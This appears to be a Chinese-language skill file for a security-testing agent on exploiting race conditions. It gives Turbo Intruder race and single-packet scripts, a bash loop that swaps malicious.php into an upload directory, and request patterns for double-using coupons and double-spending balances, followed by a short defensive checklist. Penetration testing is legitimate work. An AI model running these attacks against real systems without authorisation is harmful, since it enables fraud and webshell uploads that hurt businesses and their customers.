---
name: race-condition-testing
description: 竞争条件漏洞测试，覆盖TOCTOU→并发绕过→秒杀→优惠券→库存竞争→文件竞争→Turbo Intruder实战全流程
---

# 竞争条件与并发漏洞测试

## 1. 检测方法

### 1.1 常见竞争条件场景

```
秒杀/抢购: 同时提交 → 超卖
优惠券: 同一张券被多次使用
注册: 同一邀请码多次注册
文件上传: 上传+删除的时间窗口
密码重置: 令牌检查+密码修改的窗口
转账/提现: 余额查询+扣款之间的窗口
```

### 1.2 检测技巧

```bash
# 用不同数量的并发请求测试:
# 1: 正常 (基线)
# 10: 低并发
# 50: 中并发
# 100+: 高并发

# 关键信号:
# - 响应时间突然增加 (说明有锁)
# - 同一资源被多次操作成功
# - 金额/数量异常
```

## 2. Turbo Intruder 竞争脚本

```python
# 秒杀/抢购脚本
def queueRequests(target, ...):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
    )
    for i in range(50):
        engine.queue(target.req, gate='race')
    engine.openGate('race')
```

### 2.1 单包攻击 (Single-Packet Attack)

```python
# 利用last-byte sync技术, 所有请求在同一TCP包发送
# 需要: Turbor Intruder + HTTP/2
def queueRequests(target, ...):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        engine=Engine.BURP2
    )
    for i in range(50):
        engine.queue(target.req, gate='race')
    engine.openGate('race')
```

## 3. 优惠券/折扣竞争

```
场景: 满100减99的券只能用一次
测试: 
1. 同一账号, 用同一张券同时下2个单
2. 如果两个订单都减了99 → 竞争漏洞确认
```

## 4. 文件竞争 (TOCTOU)

```bash
# 场景: 应用先检查文件类型, 再移动文件
# 攻击: 在检查和移动之间替换文件

# 利用脚本:
#!/bin/bash
while true; do
    cp malicious.php /tmp/upload/race.php &
    cp normal.jpg /tmp/upload/race.php &
done
```

## 5. 密码重置竞争

```
# 场景1: 同时发送2个不同新密码的请求
POST /reset-password?token=XXX
  Body: new_password=A
POST /reset-password?token=XXX  
  Body: new_password=B
# 两个都成功 → 竞争漏洞

# 场景2: 重置+登录竞争
# 在重置完成前用旧密码登录
```

## 6. 转账/支付竞争

```
# 并发转账 (余额竞争):
# 余额100 → 同时2笔转出100
# 两个都成功 → 出超

# 并发充值+消费:
# 充值100 + 立即消费100, 同时发生
# → 金额可能被 "double-spend"
```

## 7. 条件竞争防护检查清单

```
检查项:
├─ 数据库层面: SELECT ... FOR UPDATE / 唯一约束
├─ 应用层面: 分布式锁(Redis) / 乐观锁(version)
├─ 网络层面: 是否HTTP/2 + 单包攻击可行?
└─ 业务层面: 同一操作是否有幂等校验?
```

---

*参考: PortSwigger Race Conditions + James Kettle Research*
